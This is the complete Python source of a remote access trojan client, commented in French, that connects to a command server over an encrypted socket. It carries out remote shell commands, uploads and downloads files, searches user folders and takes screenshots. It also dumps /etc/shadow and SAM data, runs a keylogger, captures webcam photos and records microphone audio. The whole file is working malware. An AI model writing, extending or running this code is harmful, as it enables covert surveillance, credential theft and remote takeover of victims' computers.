import socket
import json
import struct
import getpass
import platform
import subprocess
import threading
import time
import os
import base64
import glob
import hashlib
import io
from cryptography.fernet import Fernet

# Imports optionnels avec fallback
try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import pyaudio
    import wave
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False

try:
    import pynput
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# Configuration
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
ENCRYPTION_KEY = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='

def pack_message(cipher, message_dict):
    json_data = json.dumps(message_dict).encode()
    encrypted = cipher.encrypt(json_data)
    size = struct.pack('!I', len(encrypted))
    return size + encrypted

def unpack_message(cipher, data):
    try:
        decrypted = cipher.decrypt(data)
        return json.loads(decrypted.decode())
    except:
        return None

def recv_exact(sock, length):
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def receive_message(sock, cipher):
    size_data = recv_exact(sock, 4)
    if not size_data:
        return None
    
    size = struct.unpack('!I', size_data)[0]
    message_data = recv_exact(sock, size)
    if not message_data:
        return None
    
    return unpack_message(cipher, message_data)

class CompleteRatClient:
    def __init__(self):
        self.cipher = Fernet(ENCRYPTION_KEY)
        self.running = False
        self.sock = None
        self.keylogger_active = False
        self.keylogger_logs = []
        self.keylogger_listener = None
        
    def execute_shell_command(self, command):
        """Exécute une commande shell"""
        try:
            print(f"[DEBUG] Executing: {command}")
            if platform.system().lower() == "windows":
                result = subprocess.run(["cmd", "/c", command], 
                                      capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["/bin/bash", "-c", command], 
                                      capture_output=True, text=True, timeout=30)
            
            output = result.stdout
            if result.stderr:
                output += f"\nErrors:\n{result.stderr}"
            
            return output.strip() if output.strip() else "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            return "Command timeout (30 seconds)"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def get_network_info(self):
        """Récupère les infos réseau"""
        try:
            if platform.system().lower() == "windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
            
            return result.stdout if result.returncode == 0 else "Failed to get network info"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def take_screenshot(self):
        """Prend une capture d'écran"""
        try:
            print(f"[DEBUG] Taking screenshot...")
            
            if PIL_AVAILABLE:
                # Utilise PIL
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                return buffer.getvalue()
                
            elif MSS_AVAILABLE:
                # Utilise MSS
                with mss.mss() as sct:
                    monitor = sct.monitors[1]  # écran principal
                    screenshot = sct.grab(monitor)
                    return mss.tools.to_png(screenshot.rgb, screenshot.size)
                    
            else:
                return None
                
        except Exception as e:
            print(f"[DEBUG] Screenshot error: {e}")
            return None
    
    def download_file(self, filepath):
        """Télécharge un fichier de la machine"""
        try:
            print(f"[DEBUG] Downloading file: {filepath}")
            
            if not os.path.exists(filepath):
                return None, f"File not found: {filepath}"
            
            if os.path.getsize(filepath) > 50 * 1024 * 1024:  # 50MB limit
                return None, "File too large (>50MB)"
            
            with open(filepath, "rb") as f:
                file_data = f.read()
            
            return file_data, None
            
        except Exception as e:
            return None, f"Error reading file: {str(e)}"
    
    def upload_file(self, filepath, data):
        """Upload un fichier sur la machine"""
        try:
            print(f"[DEBUG] Uploading file: {filepath}")
            
            # Crée le dossier si nécessaire
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            with open(filepath, "wb") as f:
                f.write(data)
            
            return True, None
            
        except Exception as e:
            return False, f"Error writing file: {str(e)}"
    
    def search_files(self, pattern, max_results=50):
        """Recherche des fichiers"""
        try:
            print(f"[DEBUG] Searching for: {pattern}")
            results = []
            
            # Recherche dans le répertoire courant et sous-dossiers
            for root, dirs, files in os.walk("."):
                for file in files:
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        results.append(full_path)
                        if len(results) >= max_results:
                            break
                if len(results) >= max_results:
                    break
            
            # Recherche dans des dossiers communs
            common_dirs = []
            if platform.system().lower() == "windows":
                user_profile = os.environ.get('USERPROFILE', '')
                common_dirs = [
                    os.path.join(user_profile, "Desktop"),
                    os.path.join(user_profile, "Documents"),
                    os.path.join(user_profile, "Downloads"),
                ]
            else:
                home = os.path.expanduser("~")
                common_dirs = [
                    os.path.join(home, "Desktop"),
                    os.path.join(home, "Documents"),
                    os.path.join(home, "Downloads"),
                ]
            
            for dir_path in common_dirs:
                if os.path.exists(dir_path) and len(results) < max_results:
                    try:
                        for root, dirs, files in os.walk(dir_path):
                            for file in files:
                                if pattern.lower() in file.lower():
                                    full_path = os.path.join(root, file)
                                    if full_path not in results:
                                        results.append(full_path)
                                        if len(results) >= max_results:
                                            break
                            if len(results) >= max_results:
                                break
                    except:
                        continue
            
            return results[:max_results]
            
        except Exception as e:
            print(f"[DEBUG] Search error: {e}")
            return []
    
    def dump_hashes(self):
        """Dump les hashes du système"""
        try:
            print(f"[DEBUG] Dumping hashes...")
            
            if platform.system().lower() == "windows":
                # Tentative de dump SAM
                try:
                    # Method 1: reg query
                    result = subprocess.run([
                        "reg", "query", "HKLM\\SAM\\SAM\\Domains\\Account\\Users"
                    ], capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        return f"SAM Registry Keys:\n{result.stdout}"
                    
                    # Method 2: Try to access SAM file directly
                    sam_path = "C:\\Windows\\System32\\config\\SAM"
                    if os.path.exists(sam_path):
                        try:
                            with open(sam_path, "rb") as f:
                                # Just check if we can read it
                                f.read(100)
                            return f"SAM file accessible at: {sam_path} (requires admin privileges to extract hashes)"
                        except:
                            return "SAM file found but access denied (requires admin privileges)"
                    
                    return "SAM access failed - insufficient privileges"
                    
                except Exception as e:
                    return f"Windows hash dump failed: {str(e)}"
            
            else:
                # Linux/Unix - tentative de lecture shadow
                shadow_path = "/etc/shadow"
                passwd_path = "/etc/passwd"
                
                result = ""
                
                try:
                    with open(passwd_path, "r") as f:
                        passwd_content = f.read()
                    result += f"Password file (/etc/passwd):\n{passwd_content}\n\n"
                except:
                    result += "Could not read /etc/passwd\n\n"
                
                try:
                    with open(shadow_path, "r") as f:
                        shadow_content = f.read()
                    result += f"Shadow file (/etc/shadow):\n{shadow_content}"
                except:
                    result += "Could not read /etc/shadow (permission denied)"
                
                return result if result else "Hash dump failed - insufficient privileges"
                
        except Exception as e:
            return f"Hash dump error: {str(e)}"
    
    def start_keylogger(self):
        """Démarre le keylogger"""
        try:
            if not PYNPUT_AVAILABLE:
                return False, "pynput library not available"
            
            if self.keylogger_active:
                return False, "Keylogger already active"
            
            print(f"[DEBUG] Starting keylogger...")
            
            def on_key_press(key):
                if not self.keylogger_active:
                    return False
                
                try:
                    if hasattr(key, 'char') and key.char is not None:
                        self.keylogger_logs.append(key.char)
                    else:
                        key_name = str(key).replace("Key.", "")
                        if key_name == "space":
                            self.keylogger_logs.append(" ")
                        elif key_name == "enter":
                            self.keylogger_logs.append("\n")
                        elif key_name == "tab":
                            self.keylogger_logs.append("\t")
                        elif key_name == "backspace":
                            if self.keylogger_logs:
                                self.keylogger_logs.pop()
                        else:
                            self.keylogger_logs.append(f"[{key_name}]")
                    
                    # Limite la taille
                    if len(self.keylogger_logs) > 1000:
                        self.keylogger_logs = self.keylogger_logs[-500:]
                        
                except Exception:
                    pass
            
            self.keylogger_listener = keyboard.Listener(on_press=on_key_press)
            self.keylogger_listener.start()
            self.keylogger_active = True
            self.keylogger_logs = []
            
            return True, "Keylogger started"
            
        except Exception as e:
            return False, f"Keylogger start error: {str(e)}"
    
    def stop_keylogger(self):
        """Arrête le keylogger"""
        try:
            if not self.keylogger_active:
                return "Keylogger not active"
            
            print(f"[DEBUG] Stopping keylogger...")
            
            self.keylogger_active = False
            
            if self.keylogger_listener:
                self.keylogger_listener.stop()
            
            logs = "".join(self.keylogger_logs)
            self.keylogger_logs = []
            
            return f"Keylogger stopped. Captured:\n{logs}" if logs else "Keylogger stopped (no keys captured)"
            
        except Exception as e:
            return f"Keylogger stop error: {str(e)}"
    
    def take_webcam_photo(self):
        """Prend une photo avec la webcam"""
        try:
            if not CV2_AVAILABLE:
                return None, "OpenCV library not available"
            
            print(f"[DEBUG] Taking webcam photo...")
            
            # Ouvre la caméra
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return None, "Could not access webcam"
            
            # Laisse le temps à la caméra de s'initialiser
            time.sleep(1)
            
            # Prend la photo
            ret, frame = camera.read()
            camera.release()
            
            if ret:
                # Encode en JPEG
                _, buffer = cv2.imencode('.jpg', frame)
                return buffer.tobytes(), None
            else:
                return None, "Failed to capture frame"
                
        except Exception as e:
            return None, f"Webcam error: {str(e)}"
    
    def start_webcam_stream(self):
        """Démarre le streaming webcam"""
        # Pour cette version, on retourne juste un message
        # L'implémentation complète nécessiterait un protocole de streaming
        return "Webcam streaming would require a streaming protocol (not implemented in this version)"
    
    def record_audio(self, duration=5):
        """Enregistre de l'audio"""
        try:
            if not PYAUDIO_AVAILABLE:
                return None, "PyAudio library not available"
            
            print(f"[DEBUG] Recording audio for {duration} seconds...")
            
            # Configuration audio
            format = pyaudio.paInt16
            channels = 2
            rate = 44100
            chunk = 1024
            
            audio = pyaudio.PyAudio()
            
            # Ouvre le stream
            stream = audio.open(
                format=format,
                channels=channels,
                rate=rate,
                input=True,
                frames_per_buffer=chunk
            )
            
            frames = []
            
            # Enregistre
            for _ in range(0, int(rate / chunk * duration)):
                data = stream.read(chunk)
                frames.append(data)
            
            # Ferme le stream
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            # Crée le fichier WAV en mémoire
            buffer = io.BytesIO()
            wf = wave.open(buffer, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(audio.get_sample_size(format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            return buffer.getvalue(), None
            
        except Exception as e:
            return None, f"Audio recording error: {str(e)}"
    
    def handle_command(self, message):
        """Traite les commandes - IMPLÉMENTATION COMPLÈTE"""
        try:
            cmd_type = message.get("type", "unknown")
            args = message.get("data", {}).get("args", [])
            
            print(f"[DEBUG] Handling: {cmd_type}")
            
            if cmd_type == "help":
                output = """RAT Client - Available commands:
✅ help: Show this help
✅ shell <cmd>: Execute shell command  
✅ ipconfig: Show network configuration
✅ screenshot: Take screenshot
✅ download <file>: Download file from target
✅ upload <file> <base64_data>: Upload file to target
✅ search <pattern>: Search files
✅ hashdump: Dump password hashes
✅ keylogger start/stop: Control keylogger
✅ webcam_snapshot: Take webcam photo
✅ webcam_stream: Stream webcam (basic implementation)
✅ record_audio <duration>: Record audio

All commands are fully implemented!"""
                
                response = {
                    "type": "help",
                    "data": {"output": output},
                    "status": "ok"
                }
                
            elif cmd_type == "shell":
                if not args:
                    output = "Usage: shell <command>"
                else:
                    cmd = " ".join(args)
                    output = self.execute_shell_command(cmd)
                
                response = {
                    "type": "shell",
                    "data": {"output": output},
                    "status": "ok"
                }
                
            elif cmd_type == "ipconfig":
                output = self.get_network_info()
                response = {
                    "type": "ipconfig",
                    "data": {"output": output},
                    "status": "ok"
                }
                
            elif cmd_type == "screenshot":
                screenshot_data = self.take_screenshot()
                if screenshot_data:
                    encoded = base64.b64encode(screenshot_data).decode()
                    response = {
                        "type": "screenshot",
                        "data": {"image_data": encoded},
                        "status": "ok"
                    }
                else:
                    response = {
                        "type": "screenshot",
                        "data": {"output": "Screenshot failed - no capture library available (install PIL or mss)"},
                        "status": "ok"
                    }
                    
            elif cmd_type == "download":
                if not args:
                    output = "Usage: download <filepath>"
                    response = {
                        "type": "download",
                        "data": {"output": output},
                        "status": "ok"
                    }
                else:
                    filepath = args[0]
                    file_data, error = self.download_file(filepath)
                    if file_data:
                        encoded = base64.b64encode(file_data).decode()
                        filename = os.path.basename(filepath)
                        response = {
                            "type": "download",
                            "data": {
                                "file_data": encoded,
                                "filename": filename,
                                "output": f"File downloaded: {filename} ({len(file_data)} bytes)"
                            },
                            "status": "ok"
                        }
                    else:
                        response = {
                            "type": "download",
                            "data": {"output": error},
                            "status": "ok"
                        }
                        
            elif cmd_type == "upload":
                if len(args) < 2:
                    output = "Usage: upload <filepath> <base64_data>"
                    response = {
                        "type": "upload",
                        "data": {"output": output},
                        "status": "ok"
                    }
                else:
                    filepath = args[0]
                    try:
                        file_data = base64.b64decode(args[1])
                        success, error = self.upload_file(filepath, file_data)
                        if success:
                            output = f"File uploaded successfully: {filepath} ({len(file_data)} bytes)"
                        else:
                            output = error
                    except Exception as e:
                        output = f"Upload error: {str(e)}"
                    
                    response = {
                        "type": "upload",
                        "data": {"output": output},
                        "status": "ok"
                    }
                    
            elif cmd_type == "search":
                if not args:
                    output = "Usage: search <pattern>"
                    response = {
                        "type": "search",
                        "data": {"output": output},
                        "status": "ok"
                    }
                else:
                    pattern = args[0]
                    results = self.search_files(pattern)
                    if results:
                        output = f"Found {len(results)} files:\n" + "\n".join(results)
                    else:
                        output = f"No files found matching: {pattern}"
                    
                    response = {
                        "type": "search",
                        "data": {"output": output},
                        "status": "ok"
                    }
                    
            elif cmd_type == "hashdump":
                output = self.dump_hashes()
                response = {
                    "type": "hashdump",
                    "data": {"output": output},
                    "status": "ok"
                }
                
            elif cmd_type == "keylogger":
                if not args:
                    output = "Usage: keylogger start/stop"
                    response = {
                        "type": "keylogger",
                        "data": {"output": output},
                        "status": "ok"
                    }
                else:
                    action = args[0].lower()
                    if action == "start":
                        success, message = self.start_keylogger()
                        output = message
                    elif action == "stop":
                        output = self.stop_keylogger()
                    else:
                        output = "Usage: keylogger start/stop"
                    
                    response = {
                        "type": "keylogger",
                        "data": {"output": output},
                        "status": "ok"
                    }
                    
            elif cmd_type == "webcam_snapshot":
                photo_data, error = self.take_webcam_photo()
                if photo_data:
                    encoded = base64.b64encode(photo_data).decode()
                    response = {
                        "type": "webcam_snapshot",
                        "data": {"image_data": encoded},
                        "status": "ok"
                    }
                else:
                    response = {
                        "type": "webcam_snapshot",
                        "data": {"output": error},
                        "status": "ok"
                    }
                    
            elif cmd_type == "webcam_stream":
                output = self.start_webcam_stream()
                response = {
                    "type": "webcam_stream",
                    "data": {"output": output},
                    "status": "ok"
                }
                
            elif cmd_type == "record_audio":
                duration = 5
                if args:
                    try:
                        duration = int(args[0])
                    except ValueError:
                        pass
                
                audio_data, error = self.record_audio(duration)
                if audio_data:
                    encoded = base64.b64encode(audio_data).decode()
                    response = {
                        "type": "record_audio",
                        "data": {
                            "audio_data": encoded,
                            "output": f"Audio recorded: {duration} seconds"
                        },
                        "status": "ok"
                    }
                else:
                    response = {
                        "type": "record_audio",
                        "data": {"output": error},
                        "status": "ok"
                    }
                    
            else:
                output = f"Unknown command: {cmd_type}"
                response = {
                    "type": cmd_type,
                    "data": {"output": output},
                    "status": "ok"
                }
            
            return response
            
        except Exception as e:
            print(f"[ERROR] Command error: {e}")
            import traceback
            traceback.print_exc()
            return {
                "type": message.get("type", "error"),
                "data": {"output": f"Command error: {str(e)}"},
                "status": "ok"
            }
    
    def start_heartbeat(self):
        """Démarre le heartbeat en arrière-plan"""
        def heartbeat_loop():
            while self.running:
                try:
                    time.sleep(30)
                    if not self.running:
                        break
                        
                    heartbeat = {
                        "type": "heartbeat",
                        "data": {},
                        "status": "ok"
                    }
                    
                    data = pack_message(self.cipher, heartbeat)
                    self.sock.sendall(data)
                    print("[DEBUG] ♥ Heartbeat sent")
                    
                except Exception as e:
                    print(f"[ERROR] Heartbeat error: {e}")
                    break
        
        heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        print("[DEBUG] Heartbeat started")

    def main(self):
        print("=== COMPLETE RAT CLIENT ===")
        print("Client avec TOUTES les fonctionnalités implémentées!")
        print()
        print("📦 Libraries disponibles:")
        print(f"  PIL (screenshots): {'✅' if PIL_AVAILABLE else '❌'}")
        print(f"  MSS (screenshots): {'✅' if MSS_AVAILABLE else '❌'}")  
        print(f"  OpenCV (webcam): {'✅' if CV2_AVAILABLE else '❌'}")
        print(f"  PyAudio (audio): {'✅' if PYAUDIO_AVAILABLE else '❌'}")
        print(f"  pynput (keylogger): {'✅' if PYNPUT_AVAILABLE else '❌'}")
        print()
        
        try:
            # Connect
            print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((SERVER_HOST, SERVER_PORT))
            print("[+] Connected!")
            
            # Send client info
            client_info = {
                "type": "client_info",
                "data": {
                    "os": platform.system(),
                    "os_version": platform.release(),
                    "architecture": platform.machine(),
                    "hostname": socket.gethostname(),
                    "user": getpass.getuser(),
                    "python_version": platform.python_version(),
                    "libraries": {
                        "PIL": PIL_AVAILABLE,
                        "MSS": MSS_AVAILABLE,
                        "OpenCV": CV2_AVAILABLE,
                        "PyAudio": PYAUDIO_AVAILABLE,
                        "pynput": PYNPUT_AVAILABLE
                    }
                },
                "status": "ok"
            }
            
            data = pack_message(self.cipher, client_info)
            self.sock.sendall(data)
            print("[+] Client info sent!")
            
            self.running = True
            
            # Démarre le heartbeat
            self.start_heartbeat()
            
            # Main loop
            while self.running:
                print("[*] Waiting for command...")
                message = receive_message(self.sock, self.cipher)
                
                if not message:
                    print("[!] No message, disconnecting")
                    break
                
                cmd_type = message.get("type", "unknown")
                print(f"[*] Received: {cmd_type}")
                
                # Ignore heartbeat_ack
                if cmd_type == "heartbeat_ack":
                    print("[DEBUG] Heartbeat ack (ignored)")
                    continue
                
                # Handle commands
                response = self.handle_command(message)
                
                print(f"[*] Sending response for: {cmd_type}")
                response_data = pack_message(self.cipher, response)
                self.sock.sendall(response_data)
                print(f"[+] Response sent!")
            
            self.sock.close()
            print("[*] Disconnected")
            
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            self.running = False
            # Arrête le keylogger si actif
            if self.keylogger_active:
                self.stop_keylogger()

if __name__ == "__main__":
    client = CompleteRatClient()
    
    try:
        client.main()
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
        client.running = False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        client.running = False